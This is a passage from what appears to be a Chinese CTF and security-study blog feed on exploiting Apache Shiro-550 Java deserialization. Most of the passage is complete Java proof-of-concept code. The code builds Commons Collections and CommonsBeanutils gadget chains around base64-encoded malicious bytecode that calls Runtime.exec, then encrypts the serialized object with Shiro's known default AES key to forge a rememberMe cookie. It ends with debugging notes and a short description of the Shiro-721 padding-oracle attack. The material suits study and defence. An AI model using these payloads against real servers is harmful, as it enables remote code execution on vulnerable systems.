class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>)&#125;);</span><br><span class="line">            setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;h3110h4ck3r&quot;</span>);</span><br><span class="line">            <span class="comment">// setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">fakeTransformers</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">evilTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                                                                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,fakeTransformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>));</span><br><span class="line">            <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">            expMap.put(tiedMapEntry,<span class="string">&quot;feng2&quot;</span>);</span><br><span class="line"></span><br><span class="line">            outerMap.remove(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">            factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            factoryField.set(outerMap,evilTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 进行序列化 * * * * * */</span></span><br><span class="line">            <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">            oos.writeObject(expMap);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// shiro550的处理</span></span><br><span class="line">            <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">            <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">            <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(barr.toByteArray(),key);</span><br><span class="line">            System.out.println(ciphertext.toString());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// // 本地测试</span></span><br><span class="line">            <span class="comment">// ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span></span><br><span class="line">            <span class="comment">// Object o = (Object) ois.readObject();</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CB1-8-3’s-Shiro550"><a href="#CB1-8-3’s-Shiro550" class="headerlink" title="CB1.8.3’s Shiro550"></a>CB1.8.3’s Shiro550</h2><h3 id="查看CB依赖"><a href="#查看CB依赖" class="headerlink" title="查看CB依赖"></a>查看CB依赖</h3><ol><li>观察IDEA中的依赖库，在我们没有手动添加cb依赖时就可以看到加载了这个库: 也就是说，<strong>Shiro是依赖于commons-beanutils的</strong><img src="/pic/Java%E5%AE%89%E5%85%A85(13)_shiro550/%E8%87%AA%E5%B8%A6CB.png" alt="自带CB"></li><li>观察这里的CB依赖库可以发现，<strong>shiro的CB是带有一部分cc库的，但是不完全</strong></li><li>使用CB尝试进行攻击</li></ol><h3 id="CB1报错但和p牛不一样？"><a href="#CB1报错但和p牛不一样？" class="headerlink" title="CB1报错但和p牛不一样？"></a>CB1报错但和p牛不一样？</h3><ol><li>这个其实是因为我的本地环境配置环境和p牛不一样导致的</li><li><em><strong>serialVersionUID问题</strong></em><ol><li>p牛是在本地项目跑到一个beanutils导致version不一样，我这里是直接在shiro源码的库依赖存在的情况下跑了，用到就是同一个beanutils</li></ol></li><li><em><strong>java.lang.ClassNotFoundException问题</strong></em><ol><li><p>这里需要经本地在跑上面CC3.2.1后将pom.xml中的cc库依赖给注释掉后再reload才会发生，这时就没有将cc库加到classpath里(虽然有对应jar没卸载)，随后再次运行就会报错</p><ol><li>这里要使用idea搜索功能找到pom.xml进行注释掉，在shiro-root(根目录)那个的pom.xml就ok</li></ol></li><li><p><code>org.apache.shiro.util.UnknownClassException: Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.</code></p></li><li><p>可以知道这个报错信息是因为: <strong>CB中的CC没有带ComparableComparator这件事情</strong>，ComparableComparator是CC库中的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.comparators;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComparableComparator</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span>, Serializable &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="无依赖的Shiro利用链"><a href="#无依赖的Shiro利用链" class="headerlink" title="无依赖的Shiro利用链"></a>无依赖的Shiro利用链</h3><ol><li><p>顺着思路往下走，既然此时没有 ComparableComparator ，我们需要找到一个类来替换，它满足下面这几个条件：</p><ol><li>实现 java.util.Comparator 接口</li><li>实现 java.io.Serializable 接口Java、shiro或commons-beanutils自带，且兼容性强</li></ol></li><li><p>我们这里选择了<code>CaseInsensitiveComparator</code>，<em><strong>其他自带的对应类也是可以的</strong></em></p><ol><li>这个是String类中的内部类，可以直接获取一个CaseInsensitiveComparator，所以下面构造我们的payload</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">String</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER</span><br><span class="line">                                      = <span class="keyword">new</span> <span class="title class_">CaseInsensitiveComparator</span>();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CaseInsensitiveComparator</span></span><br><span class="line">         <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;String&gt;, java.io.Serializable &#123;</span><br><span class="line">     <span class="comment">// use serialVersionUID from JDK 1.2.2 for interoperability</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">8575799808933029326L</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(String s1, String s2)</span> &#123;</span><br><span class="line">         <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> s1.length();</span><br><span class="line">         <span class="type">int</span> <span class="variable">n2</span> <span class="operator">=</span> s2.length();</span><br><span class="line">         <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> Math.min(n1, n2);</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; min; i++) &#123;</span><br><span class="line">             <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> s1.charAt(i);</span><br><span class="line">             <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> s2.charAt(i);</span><br><span class="line">             <span class="keyword">if</span> (c1 != c2) &#123;</span><br><span class="line">                 c1 = Character.toUpperCase(c1);</span><br><span class="line">                 c2 = Character.toUpperCase(c2);</span><br><span class="line">                 <span class="keyword">if</span> (c1 != c2) &#123;</span><br><span class="line">                     c1 = Character.toLowerCase(c1);</span><br><span class="line">                     c2 = Character.toLowerCase(c2);</span><br><span class="line">                     <span class="keyword">if</span> (c1 != c2) &#123;</span><br><span class="line">                         <span class="comment">// No overflow because of numeric promotion</span></span><br><span class="line">                         <span class="keyword">return</span> c1 - c2;</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> n1 - n2;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/** Replaces the de-serialized object. */</span></span><br><span class="line">     <span class="keyword">private</span> Object <span class="title function_">readResolve</span><span class="params">()</span> &#123; <span class="keyword">return</span> CASE_INSENSITIVE_ORDER; &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="CB1-8-3’s-shiro550-poc"><a href="#CB1-8-3’s-shiro550-poc" class="headerlink" title="CB1.8.3’s + shiro550 poc"></a>CB1.8.3’s + shiro550 poc</h3><ol><li><p>先给个gadget</p><ol><li>就是CB1链子换了个比较器而已</li><li>怪，一直弹不出来，用p牛的就可以，怀疑是恶意类的问题，重新写一个恶意类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro550;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="comment">// 这两个sb东西卡了两个小时，同名的东西，隐隐约约感觉会有这一个天，还是来了</span></span><br><span class="line"><span class="comment">// import org.apache.xalan.xsltc.trax.TemplatesImpl;</span></span><br><span class="line"><span class="comment">// import org.apache.xalan.xsltc.trax.TransformerFactoryImpl;</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 可以执行恶意命令</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1_poc_shiro550</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 1. 构造Templates Payload * * * * * */</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">payloadObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            <span class="comment">// javac RCE.java &amp;&amp; cat RCE.class | base64 -w 0</span></span><br><span class="line">            setFieldValue(payloadObj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;Base64.getDecoder().decode(</span><br><span class="line">                      <span class="string">&quot;yv66vgAAADMALwoACQAWCQAXABgIABkKABoAGwoAHAAdCAAeCgAcAB8HACAHACEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb&quot;</span>+</span><br><span class="line">                          <span class="string">&quot;20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAIgEApihMY2&quot;</span>+</span><br><span class="line">                          <span class="string">&quot;9tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGF&quot;</span>+</span><br><span class="line">                          <span class="string">&quot;jaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYHACMBAApTb3VyY2VGaWxlAQAIUkNFLmphdmEMABEAEgcAJAwAJQAmAQARSGVs&quot;</span>+</span><br><span class="line">                          <span class="string">&quot;bG8gZnJvbSBLQzF6czQHACcMACgAKQcAKgwAKwAsAQAEY2FsYwwALQAuAQADUkNFAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc&quot;</span>+</span><br><span class="line">                          <span class="string">&quot;2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQ&quot;</span>+</span><br><span class="line">                          <span class="string">&quot;AVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWU&quot;</span>+</span><br><span class="line">                          <span class="string">&quot;BABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAABkAAAADAAAAAbEAAAAB&quot;</span>+</span><br><span class="line">                          <span class="string">&quot;AA0AAAAGAAEAAAAIAA4AAAAEAAEADwABAAoAEAACAAwAAAAZAAAABAAAAAGxAAAAAQANAAAABgABAAAACgAOAAAABAABAA8AAQARABIAAgAMAAAAOgACAAEAAAAWKrcAAbIAAhIDtgAEuAAFEga2AAdXsQAAAAEADQAAABIABAAAAA0ABAAOAAwADwAVABAADgAAAAQAAQATAAEAFAAAAAIAFQ==&quot;</span>)&#125;);</span><br><span class="line">            setFieldValue(payloadObj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">            setFieldValue(payloadObj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 设置触发器 * * * * * */</span></span><br><span class="line">            <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">            <span class="type">PriorityQueue</span> <span class="variable">triggerObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">            <span class="comment">// // 下面可以判断出PriorityQueue应该是一个最小堆，这里可以不用插入</span></span><br><span class="line">            <span class="comment">// triggerObj.add(2);</span></span><br><span class="line">            <span class="comment">// triggerObj.add(1);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 反射设置恶意代码 * * * * * */</span></span><br><span class="line">            setFieldValue(triggerObj,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;payloadObj, payloadObj&#125;);</span><br><span class="line">            setFieldValue(triggerObj, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);   <span class="comment">// 需要进行设置，构造函数中只是初始容量</span></span><br><span class="line">            setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 序列化与反序列化 * * * * * */</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">            oos.writeObject(triggerObj);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 5. shiro550的处理 * * * * * */</span></span><br><span class="line">            <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">            <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">            <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(barr.toByteArray(),key);</span><br><span class="line">            System.out.println(ciphertext.toString());</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 6. 本地反序列化检查 * * * * * */</span></span><br><span class="line">            <span class="comment">// System.out.println(barr);</span></span><br><span class="line">            <span class="comment">// ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span></span><br><span class="line">            <span class="comment">// Object o = (Object) ois.readObject();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="关于CB链poc中发生糟心事"><a href="#关于CB链poc中发生糟心事" class="headerlink" title="*关于CB链poc中发生糟心事"></a>*关于CB链poc中发生糟心事</h3><h4 id="1-同名包的问题"><a href="#1-同名包的问题" class="headerlink" title="1. 同名包的问题"></a>1. 同名包的问题</h4><ol><li>这里写了个poc，一p牛的，一个自己改的，结果内容一样但是我的就是不行，在浪费两个小时排查后发现了：是导入包的问题</li><li><strong>有对比的最好debug，看看那里不同，包与要看而且更加容易忽略</strong></li></ol><h4 id="2-直接readObject不弹的问题"><a href="#2-直接readObject不弹的问题" class="headerlink" title="2. 直接readObject不弹的问题"></a>2. 直接readObject不弹的问题</h4><ol><li><p>这里是因为某个依赖没有加载好，<strong>按着报错找，再上网搜</strong></p></li><li><p>再加上网上搜索一下，最终解决是再对应的那个包添加<code>&lt;scope&gt;compile&lt;scope&gt;</code>再shiro-root的pom.xml中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pom.xml in shiro-root</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;!-- Required in the sample apps only <span class="keyword">for</span> 3rd-party libraries that expect to call</span><br><span class="line">        the commons logging APIs --&gt;</span><br><span class="line">   &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;jcl-over-slf4j&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;$&#123;slf4j.version&#125;&lt;/version&gt;</span><br><span class="line">   &lt;scope&gt;compile&lt;/scope&gt;</span><br><span class="line">   &lt;!-- &lt;scope&gt;test&lt;/scope&gt; --&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li></ol><h4 id="3-SLF4J-Failed-to-load-class-“org-slf4j-impl-StaticLoggerBinder”"><a href="#3-SLF4J-Failed-to-load-class-“org-slf4j-impl-StaticLoggerBinder”" class="headerlink" title="3. SLF4J: Failed to load class “org.slf4j.impl.StaticLoggerBinder”"></a>3. SLF4J: Failed to load class “org.slf4j.impl.StaticLoggerBinder”</h4><ol><li><p>全部报错是，<strong>给出的链接中说的很清楚了，这里不用深究，因为有默认的NOP</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SLF4J: Failed to load class <span class="string">&quot;org.slf4j.impl.StaticLoggerBinder&quot;</span>.</span><br><span class="line">SLF4J: Defaulting to no-operation (NOP) logger implementation</span><br><span class="line">SLF4J: See http:<span class="comment">//www.slf4j.org/codes.html#StaticLoggerBinder for further details</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Shiro721-仅作介绍"><a href="#Shiro721-仅作介绍" class="headerlink" title="Shiro721(仅作介绍)"></a>Shiro721(仅作介绍)</h2><blockquote><p>影响版本: ：Apache Shiro &lt;&#x3D; 1.4.1</p></blockquote><ol><li><strong>主要不同是721多出来的部分是对AES密钥部分的猜测，返序列化部分与550相同</strong>，在反序列化部分阶段可以根据依赖直接选择对于的构造方法</li><li>Shiro721的利用关键<ol><li><strong>漏洞原理</strong>：与 Shiro 550 类似，Shiro 721 也涉及到 rememberMe 功能的反序列化问题。不过，Shiro 721 中的 AES 加密密钥不再是硬编码的，而是系统随机生成的。这意味着攻击者不能简单地使用默认密钥来构造恶意 cookie。</li><li><strong>利用方法</strong>：攻击者需要获得一个合法用户的 rememberMe cookie，然后利用 Padding Oracle Attack 技术来猜测正确的 AES 密钥，或者直接利用已知的合法 cookie 作为前缀来构造恶意 cookie。然后再使用工具如 ysoserial 生成恶意负载，并通过构造的 cookie 发送至服务器。</li></ol></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>环境搭建<ol><li><a href="https://www.cnblogs.com/h0cksr/p/16189761.html">***这篇好，可以自己添加依赖的，按照我上面的配置可以搭建起来</a></li><li>可能可以搜搜：搭建shiro应用</li><li><a href="https://blog.csdn.net/qq_44769520/article/details/123476443">一键配置版，但是用到是别人的war</a><ol><li>注意Tomcat最好使用文中要求的版本，试过9.0.57版本是无法运行给定war的，可能是与jdk不符合</li><li>注意到9要java8及以上版本才可以: <img src="/pic/Java%E5%AE%89%E5%85%A86(13)_shiro550/Tomcat%E4%B8%8Ejava%E7%89%88%E6%9C%AC.png" alt="官网上的版本图"></li></ol></li><li>p牛同款版(可能)，但是没有搭建起来，放弃了<a href="https://blog.csdn.net/m0_51545690/article/details/123077550">idea部署tomcat</a></li></ol></li><li>积累一些其他javaweb+tomcat搭建的，最终还是要学<ol><li><a href="https://blog.csdn.net/weixin_52937170/article/details/142184650">JavaWeb项目打包、部署至Tomcat并启动的全程指南（图文详解）</a></li></ol></li><li>burp抓127.0.0.1的包<ol><li><a href="https://www.cnblogs.com/z-blogs/p/14010617.html">无脑解决，但是需要使用内网ipv4</a></li></ol></li><li>CC3.2.1’s Shiro550</li><li>java安全漫谈</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全0_调试与分析</title>
      <link href="/2024/11/22/Java%E5%AE%89%E5%85%A80_%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/22/Java%E5%AE%89%E5%85%A80_%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      
